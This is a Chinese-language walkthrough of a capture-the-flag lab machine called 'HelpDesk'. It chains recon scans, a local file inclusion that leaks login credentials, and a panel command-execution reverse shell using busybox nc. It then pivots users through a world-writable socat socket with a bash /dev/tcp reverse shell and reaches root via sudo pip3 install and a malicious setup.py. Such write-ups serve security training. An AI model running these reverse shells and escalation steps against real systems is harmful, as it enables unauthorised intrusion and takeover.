# 一、信息收集

## **1. 主机发现**

首先，通过 `arp-scan` 对本地网络进行扫描，以发现目标主机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:e5:04:39       PCS Systemtechnik GmbH
...
```

扫描结果显示目标主机IP为 `192.168.205.142`。

## **2. 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 11:18 EDT
Nmap scan report for 192.168.205.142
Host is up (0.0011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E5:04:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描发现主机开放了 22 (SSH) 和 80 (HTTP) 端口。

## **3. Web目录扫描**

访问80端口，页面显示为一个正在维护的“HelpDesk Ticketing System”。为了寻找更多信息，使用 `dirsearch` 和 `gobuster` 进行目录爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.142/     
...
[11:19:21] 200 -  214B  - /debug.php
[11:19:24] 301 -  242B  - /javascript  ->  http://192.168.205.142/javascript/
[11:19:25] 200 -  756B  - /login.php
[11:19:27] 302 -    0B  - /panel.php  ->  login.php
...

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.142 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/index.php            (Status: 200) [Size: 1290]
/login.php            (Status: 200) [Size: 1819]
/ticket.php           (Status: 200) [Size: 204]
/panel.php            (Status: 302) [Size: 0] [--> login.php]
/debug.php            (Status: 200) [Size: 250]
...
```

扫描发现了几个关键文件：`debug.php`, `login.php`, `panel.php` 和 `ticket.php`。

访问 `debug.php` 页面，发现了一组凭证，但经过尝试，这组凭证无法用于登录，属于误导信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.142/debug.php   
<style>
...
</style><h2>Debug Mode Enabled</h2><pre>[DEBUG] Connecting to internal dev server...
[DEBUG] Using creds: service_user:SuperSecretDev123!</pre>
```

# 二、漏洞利用

## **1. 本地文件包含 (LFI)**

`ticket.php` 页面看起来像一个票据查看器，尝试使用 `ffuf` 对其参数进行模糊测试。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -w ... -u 'http://192.168.205.142/ticket.php?FUZZ=id' --fw 24
...
url                     [Status: 200, Size: 271, Words: 30, Lines: 5, Duration: 0ms]
...
```

Fuzzing 发现了一个名为 `url` 的参数。通过该参数，可以读取 `login.php` 的源代码，确认存在本地文件包含漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.142/ticket.php?url=login.php'
...
<h1>Ticket Viewer</h1><pre><?php
session_start();
...
// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ticketmaster
$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.';
...
?>
...
```

从 `login.php` 的源码中，获得了用户名 `helpdesk` 和密码 `ticketmaster` 的哈希值。使用 `helpdesk:ticketmaster` 成功登录了Web后台。

## **2. 命令执行与反弹Shell**

登录后的面板存在命令执行功能。利用该功能，通过 `busybox nc` 获取一个反弹shell。

在Kali上监听8888端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

在Web面板中执行：

```bash
busybox nc 192.168.205.128 8888 -e /bin/bash
```

成功获取 `www-data` 用户的shell。

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 51576
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

为方便后续操作，通过以下步骤稳定shell：

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# 三、权限提升

## **1. www-data -> helpdesk**

在目标主机上进行信息搜集，在 `/opt/helpdesk-socket/` 目录下发现了一个可利用的Unix套接字。

```bash
www-data@helpdesk:/opt/helpdesk-socket$ ls -al
total 16
drwxr-xr-x 2 helpdesk helpdesk 4096 Aug 23 15:17 .
drwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Aug 23 15:17 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
```

查看 `handler.sh` 和 `serve.sh` 脚本内容：

```bash
www-data@helpdesk:/opt/helpdesk-socket$ cat *
#!/bin/bash
# Simple parser — executes anything sent over the socket (dangerous!)
read cmd
echo "[HelpDesk Automation] Executing: $cmd"
/bin/bash -c "$cmd"
cat: helpdesk.sock: No such device or address
#!/bin/bash

SOCKET="/opt/helpdesk-socket/helpdesk.sock"

[ -e "$SOCKET" ] && rm "$SOCKET"

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
```

**知识点补充：socat 与 UNIX Socket**

*   **socat**：是一个强大的网络工具，堪称netcat的增强版。 它的核心功能是在两个数据流之间建立一个双向通道。 这些数据流可以是文件、管道、设备、TCP/UDP套接字，甚至是执行的程序。
*   **UNIX Socket**：这是一种在同一台机器上的进程间通信（IPC）机制。 它不经过网络协议栈，而是通过文件系统进行通信，因此效率更高。
*   **漏洞分析**：`serve.sh` 脚本以 `helpdesk` 用户身份运行，并使用 `socat` 创建了一个名为 `helpdesk.sock` 的UNIX套接字。 关键在于 `mode=777` 参数，它使得任何用户都对这个socket文件有读、写、执行权限。当有数据发送到这个socket时，`EXEC:/opt/helpdesk-socket/handler.sh` 会被触发，`handler.sh` 会将接收到的数据作为命令直接用 `/bin/bash -c` 执行。

利用这个漏洞，将一个反弹shell的命令通过 `socat` 发送到 `helpdesk.sock`，从而以 `helpdesk` 用户权限执行。

在Kali上重新监听8888端口，然后在 `www-data` shell中执行：

```bash
www-data@helpdesk:/opt/helpdesk-socket$ echo "/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1" | socat - /opt/helpdesk-socket/helpdesk.sock
```

成功获得 `helpdesk` 用户的shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 53106
...
helpdesk@helpdesk:/$ id
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```

## **2. helpdesk -> root**

使用 `sudo -l` 查看 `helpdesk` 用户的sudo权限。

```bash
helpdesk@helpdesk:/$ sudo -l
...
User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

发现 `helpdesk` 用户可以免密以root权限执行 `pip3 install` 命令。这是一个已知的提权向量。 当`pip install`安装一个本地目录时，它会执行该目录下的`setup.py`文件。 因此，我们可以创建一个恶意的`setup.py`文件，在其中包含提权命令。

创建一个包含提权payload的 `setup.py` 文件，该payload会给 `/bin/bash` 添加SUID权限。

```bash
helpdesk@helpdesk:~$ mkdir 1;cd 1
helpdesk@helpdesk:~/1$ echo 'import os; os.system("chmod +s /bin/bash")' > setup.py
helpdesk@helpdesk:~/1$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

使用 `sudo` 执行 `pip3 install` 来安装当前目录。

```bash
helpdesk@helpdesk:~/1$ sudo /usr/bin/pip3 install --break-system-packages .
Processing /home/helpdesk/1
  Preparing metadata (setup.py) ... done
...
helpdesk@helpdesk:~/1$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

可以看到 `/bin/bash` 已经成功被设置了SUID位。现在，执行 `bash -p` 即可获得root权限的shell。

```bash
helpdesk@helpdesk:~/1$ bash -p
bash-5.2# id
uid=1001(helpdesk) gid=1001(helpdesk) euid=0(root) egid=0(root) groups=0(root),1001(helpdesk)
bash-5.2# cat /root/root.txt /home/helpdesk/user.txt 
flag{request_has_been_escalated}
flag{ticket_approved_by_thedesk}
```

成功获取root权限并读取最终的flag。